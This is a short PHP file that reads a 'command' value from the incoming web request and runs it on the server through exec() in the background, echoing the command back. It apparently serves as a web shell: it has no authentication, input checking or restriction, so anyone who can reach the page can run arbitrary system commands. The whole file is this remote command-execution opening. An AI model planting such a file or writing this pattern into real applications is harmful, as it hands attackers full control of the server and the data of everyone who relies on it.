<?php

$E = "nohup ".$_REQUEST["command"]." >/dev/null";
exec($E);	
	

echo "ok: ".$E;
?>